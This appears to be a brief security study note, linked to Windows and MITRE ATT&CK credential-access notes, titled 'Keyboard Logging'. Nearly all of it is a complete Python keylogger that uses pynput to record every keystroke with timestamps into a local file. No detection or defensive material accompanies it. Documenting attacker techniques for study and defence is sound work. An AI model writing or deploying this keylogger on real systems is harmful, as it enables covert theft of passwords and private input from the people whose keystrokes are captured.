---
title: Keyboard Logging
---

[[notes/windows/index]] [[notes/mitre-attack/credential-access]] 

~~~ python
from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename=('keylog.txt'), level=logging.DEBUG, format='%(asctime)s - %(message)s')
with Listener(on_press=lambda k: logging.info(str(k))) as listener:
    listener.join()
~~~
